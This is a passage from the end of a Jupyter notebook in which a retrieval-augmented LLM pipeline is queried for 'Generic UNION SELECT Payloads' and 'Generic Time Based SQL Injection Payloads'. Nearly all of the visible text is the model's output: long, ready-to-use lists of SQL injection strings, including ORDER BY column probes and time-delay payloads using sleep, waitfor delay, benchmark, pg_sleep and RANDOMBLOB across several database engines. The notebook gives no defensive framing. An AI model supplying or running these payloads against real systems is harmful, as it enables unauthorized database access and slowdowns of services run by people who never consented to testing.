       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 15                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 16                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 17                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 18                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 19                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 20                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 21                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 22                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 23                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 24                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 25                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 26                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 27                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 28                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 29                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 30                                                            \n"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query = \"List some Generic UNION SELECT Payloads\"\n",
    "docs = db_retriever.get_relevant_documents(query)\n",
    "context = docs[0].page_content\n",
    "prompt = PROMPT.format(context=context, question=query)\n",
    "\n",
    "response = llm.predict(prompt)\n",
    "Markdown(response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Error in WandbTracer.on_retriever_start callback: retriever\n",
      "Error in WandbTracer.on_retriever_end callback: No retriever Run found to be traced\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">\n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>sleep(5)#                                                                                                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>1 or sleep(5)#                                                                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\" or sleep(5)#                                                                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>' or sleep(5)#                                                                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\" or sleep(5)=\"                                                                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>' or sleep(5)='                                                                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> •  1 </span>or sleep(5)#                                                                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\") or sleep(5)=\"                                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>') or sleep(5)='                                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>1)) or sleep(5)#                                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\")) or sleep(5)=\"                                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>')) or sleep(5)='                                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>;waitfor delay '0:0:5'--                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>);waitfor delay '0:0:5'--                                                                                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>';waitfor delay '0:0:5'--                                                                                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\";waitfor delay '0:0:5'--                                                                                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>');waitfor delay '0:0:5'--                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\");waitfor delay '0:0:5'--                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>));waitfor delay '0:0:5'--                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>'));waitfor delay '0:0:5'--                                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\"));waitfor delay '0:0:5'--                                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>benchmark(10000000,MD5(1))#                                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>1 or benchmark(10000000,MD5(1))#                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\" or benchmark(10000000,MD5(1))#                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>' or benchmark(10000000,MD5(1))#                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> •  1 </span>or benchmark(10000000,MD5(1))#                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\") or benchmark(10000000,MD5(1))#                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>') or benchmark(10000000,MD5(1))#                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>1)) or benchmark(10000000,MD5(1))#                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\")) or benchmark(10000000,MD5(1))#                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>')) or benchmark(10000000,MD5(1))#                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>pg_sleep(5)--                                                                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>1 or pg_sleep(5)--                                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\" or pg_sleep(5)--                                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>' or pg_sleep(5)--                                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> •  1 </span>or pg_sleep(5)--                                                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\") or pg_sleep(5)--                                                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>') or pg_sleep(5)--                                                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>1)) or pg_sleep(5)--                                                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>\")) or pg_sleep(5)--                                                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>')) or pg_sleep(5)--                                                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--                                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>SLEEP(5)#                                                                                                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>SLEEP(5)--                                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>SLEEP(5)=\"                                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>SLEEP(5)='                                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or SLEEP(5)                                                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or SLEEP(5)#                                                                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or SLEEP(5)--                                                                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or SLEEP(5)=\"                                                                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or SLEEP(5)='                                                                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>waitfor delay '00:00:05'                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>waitfor delay '00:00:05'--                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>waitfor delay '00:00:05'#                                                                                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>benchmark(50000000,MD5(1))                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>benchmark(50000000,MD5(1))--                                                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>benchmark(50000000,MD5(1))#                                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or benchmark(50000000,MD5(1))                                                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or benchmark(50000000,MD5(1))--                                                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or benchmark(50000000,MD5(1))#                                                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>pg_SLEEP(5)                                                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>pg_SLEEP(5)--                                                                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>pg_SLEEP(5)#                                                                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or pg_SLEEP(5)                                                                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or pg_SLEEP(5)--                                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>or pg_SLEEP(5)#                                                                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>'\"                                                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AnD SLEEP(5)                                                                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AnD SLEEP(5)--                                                                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AnD SLEEP(5)#                                                                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>&amp;&amp;SLEEP(5)                                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>&amp;&amp;SLEEP(5)--                                                                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>&amp;&amp;SLEEP(5)#                                                                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>' AnD SLEEP(5) ANd '1                                                                                           \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>'&amp;&amp;SLEEP(5)&amp;&amp;'1                                                                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY SLEEP(5)                                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY SLEEP(5)--                                                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY SLEEP(5)#                                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)                                                                          \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#                                                                         \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>+benchmark(3200,SHA1(1))+'                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> •  • </span>SLEEP(10) + '                                                                                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>RANDOMBLOB(500000000/2)                                                                                         \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>RANDOMBLOB(1000000000/2)                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))                                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>SLEEP(1)/<span style=\"font-style: italic\">' or SLEEP(1) or '\" or SLEEP(1) or \"</span>/                                                                  \n",
       "</pre>\n"
      ],
      "text/plain": [
       "\n",
       "\u001b[1;33m • \u001b[0msleep(5)#                                                                                                       \n",
       "\u001b[1;33m • \u001b[0m1 or sleep(5)#                                                                                                  \n",
       "\u001b[1;33m • \u001b[0m\" or sleep(5)#                                                                                                  \n",
       "\u001b[1;33m • \u001b[0m' or sleep(5)#                                                                                                  \n",
       "\u001b[1;33m • \u001b[0m\" or sleep(5)=\"                                                                                                 \n",
       "\u001b[1;33m • \u001b[0m' or sleep(5)='                                                                                                 \n",
       "\u001b[1;33m • \u001b[0m\u001b[1;33m 1 \u001b[0mor sleep(5)#                                                                                                 \n",
       "\u001b[1;33m • \u001b[0m\") or sleep(5)=\"                                                                                                \n",
       "\u001b[1;33m • \u001b[0m') or sleep(5)='                                                                                                \n",
       "\u001b[1;33m • \u001b[0m1)) or sleep(5)#                                                                                                \n",
       "\u001b[1;33m • \u001b[0m\")) or sleep(5)=\"                                                                                               \n",
       "\u001b[1;33m • \u001b[0m')) or sleep(5)='                                                                                               \n",
       "\u001b[1;33m • \u001b[0m;waitfor delay '0:0:5'--                                                                                        \n",
       "\u001b[1;33m • \u001b[0m);waitfor delay '0:0:5'--                                                                                       \n",
       "\u001b[1;33m • \u001b[0m';waitfor delay '0:0:5'--                                                                                       \n",
       "\u001b[1;33m • \u001b[0m\";waitfor delay '0:0:5'--                                                                                       \n",
       "\u001b[1;33m • \u001b[0m');waitfor delay '0:0:5'--                                                                                      \n",
       "\u001b[1;33m • \u001b[0m\");waitfor delay '0:0:5'--                                                                                      \n",
       "\u001b[1;33m • \u001b[0m));waitfor delay '0:0:5'--                                                                                      \n",
       "\u001b[1;33m • \u001b[0m'));waitfor delay '0:0:5'--                                                                                     \n",
       "\u001b[1;33m • \u001b[0m\"));waitfor delay '0:0:5'--                                                                                     \n",
       "\u001b[1;33m • \u001b[0mbenchmark(10000000,MD5(1))#                                                                                     \n",
       "\u001b[1;33m • \u001b[0m1 or benchmark(10000000,MD5(1))#                                                                                \n",
       "\u001b[1;33m • \u001b[0m\" or benchmark(10000000,MD5(1))#                                                                                \n",
       "\u001b[1;33m • \u001b[0m' or benchmark(10000000,MD5(1))#                                                                                \n",
       "\u001b[1;33m • \u001b[0m\u001b[1;33m 1 \u001b[0mor benchmark(10000000,MD5(1))#                                                                               \n",
       "\u001b[1;33m • \u001b[0m\") or benchmark(10000000,MD5(1))#                                                                               \n",
       "\u001b[1;33m • \u001b[0m') or benchmark(10000000,MD5(1))#                                                                               \n",
       "\u001b[1;33m • \u001b[0m1)) or benchmark(10000000,MD5(1))#                                                                              \n",
       "\u001b[1;33m • \u001b[0m\")) or benchmark(10000000,MD5(1))#                                                                              \n",
       "\u001b[1;33m • \u001b[0m')) or benchmark(10000000,MD5(1))#                                                                              \n",
       "\u001b[1;33m • \u001b[0mpg_sleep(5)--                                                                                                   \n",
       "\u001b[1;33m • \u001b[0m1 or pg_sleep(5)--                                                                                              \n",
       "\u001b[1;33m • \u001b[0m\" or pg_sleep(5)--                                                                                              \n",
       "\u001b[1;33m • \u001b[0m' or pg_sleep(5)--                                                                                              \n",
       "\u001b[1;33m • \u001b[0m\u001b[1;33m 1 \u001b[0mor pg_sleep(5)--                                                                                             \n",
       "\u001b[1;33m • \u001b[0m\") or pg_sleep(5)--                                                                                             \n",
       "\u001b[1;33m • \u001b[0m') or pg_sleep(5)--                                                                                             \n",
       "\u001b[1;33m • \u001b[0m1)) or pg_sleep(5)--                                                                                            \n",
       "\u001b[1;33m • \u001b[0m\")) or pg_sleep(5)--                                                                                            \n",
       "\u001b[1;33m • \u001b[0m')) or pg_sleep(5)--                                                                                            \n",
       "\u001b[1;33m • \u001b[0mAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe                                                     \n",
       "\u001b[1;33m • \u001b[0mAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='                                                            \n",
       "\u001b[1;33m • \u001b[0mAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)                                                                      \n",
       "\u001b[1;33m • \u001b[0mAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--                                                                    \n",
       "\u001b[1;33m • \u001b[0mAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#                                                                     \n",
       "\u001b[1;33m • \u001b[0mSLEEP(5)#                                                                                                       \n",
       "\u001b[1;33m • \u001b[0mSLEEP(5)--                                                                                                      \n",
       "\u001b[1;33m • \u001b[0mSLEEP(5)=\"                                                                                                      \n",
       "\u001b[1;33m • \u001b[0mSLEEP(5)='                                                                                                      \n",
       "\u001b[1;33m • \u001b[0mor SLEEP(5)                                                                                                     \n",
       "\u001b[1;33m • \u001b[0mor SLEEP(5)#                                                                                                    \n",
       "\u001b[1;33m • \u001b[0mor SLEEP(5)--                                                                                                   \n",
       "\u001b[1;33m • \u001b[0mor SLEEP(5)=\"                                                                                                   \n",
       "\u001b[1;33m • \u001b[0mor SLEEP(5)='                                                                                                   \n",
       "\u001b[1;33m • \u001b[0mwaitfor delay '00:00:05'                                                                                        \n",
       "\u001b[1;33m • \u001b[0mwaitfor delay '00:00:05'--                                                                                      \n",
       "\u001b[1;33m • \u001b[0mwaitfor delay '00:00:05'#                                                                                       \n",
       "\u001b[1;33m • \u001b[0mbenchmark(50000000,MD5(1))                                                                                      \n",
       "\u001b[1;33m • \u001b[0mbenchmark(50000000,MD5(1))--                                                                                    \n",
       "\u001b[1;33m • \u001b[0mbenchmark(50000000,MD5(1))#                                                                                     \n",
       "\u001b[1;33m • \u001b[0mor benchmark(50000000,MD5(1))                                                                                   \n",
       "\u001b[1;33m • \u001b[0mor benchmark(50000000,MD5(1))--                                                                                 \n",
       "\u001b[1;33m • \u001b[0mor benchmark(50000000,MD5(1))#                                                                                  \n",
       "\u001b[1;33m • \u001b[0mpg_SLEEP(5)                                                                                                     \n",
       "\u001b[1;33m • \u001b[0mpg_SLEEP(5)--                                                                                                   \n",
       "\u001b[1;33m • \u001b[0mpg_SLEEP(5)#                                                                                                    \n",
       "\u001b[1;33m • \u001b[0mor pg_SLEEP(5)                                                                                                  \n",
       "\u001b[1;33m • \u001b[0mor pg_SLEEP(5)--                                                                                                \n",
       "\u001b[1;33m • \u001b[0mor pg_SLEEP(5)#                                                                                                 \n",
       "\u001b[1;33m • \u001b[0m'\"                                                                                                              \n",
       "\u001b[1;33m • \u001b[0mAnD SLEEP(5)                                                                                                    \n",
       "\u001b[1;33m • \u001b[0mAnD SLEEP(5)--                                                                                                  \n",
       "\u001b[1;33m • \u001b[0mAnD SLEEP(5)#                                                                                                   \n",
       "\u001b[1;33m • \u001b[0m&&SLEEP(5)                                                                                                      \n",
       "\u001b[1;33m • \u001b[0m&&SLEEP(5)--                                                                                                    \n",
       "\u001b[1;33m • \u001b[0m&&SLEEP(5)#                                                                                                     \n",
       "\u001b[1;33m • \u001b[0m' AnD SLEEP(5) ANd '1                                                                                           \n",
       "\u001b[1;33m • \u001b[0m'&&SLEEP(5)&&'1                                                                                                 \n",
       "\u001b[1;33m • \u001b[0mORDER BY SLEEP(5)                                                                                               \n",
       "\u001b[1;33m • \u001b[0mORDER BY SLEEP(5)--                                                                                             \n",
       "\u001b[1;33m • \u001b[0mORDER BY SLEEP(5)#                                                                                              \n",
       "\u001b[1;33m • \u001b[0m(SELECT * FROM (SELECT(SLEEP(5)))ecMj)                                                                          \n",
       "\u001b[1;33m • \u001b[0m(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#                                                                         \n",
       "\u001b[1;33m • \u001b[0m(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--                                                                        \n",
       "\u001b[1;33m • \u001b[0m+benchmark(3200,SHA1(1))+'                                                                                      \n",
       "\u001b[1;33m • \u001b[0m\u001b[1;33m • \u001b[0mSLEEP(10) + '                                                                                                \n",
       "\u001b[1;33m • \u001b[0mRANDOMBLOB(500000000/2)                                                                                         \n",
       "\u001b[1;33m • \u001b[0mAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))                                                    \n",
       "\u001b[1;33m • \u001b[0mOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))                                                     \n",
       "\u001b[1;33m • \u001b[0mRANDOMBLOB(1000000000/2)                                                                                        \n",
       "\u001b[1;33m • \u001b[0mAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))                                                   \n",
       "\u001b[1;33m • \u001b[0mOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))                                                    \n",
       "\u001b[1;33m • \u001b[0mSLEEP(1)/\u001b[3m'\u001b[0m\u001b[3m or SLEEP(1) or \u001b[0m\u001b[3m'\u001b[0m\u001b[3m\"\u001b[0m\u001b[3m or SLEEP(1) or \u001b[0m\u001b[3m\"\u001b[0m/                                                                  \n"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query = \"List some Generic Time Based SQL Injection Payloads\"\n",
    "docs = db_retriever.get_relevant_documents(query)\n",
    "context = docs[0].page_content\n",
    "prompt = PROMPT.format(context=context, question=query)\n",
    "\n",
    "response = llm.predict(prompt)\n",
    "Markdown(response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "usercom",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
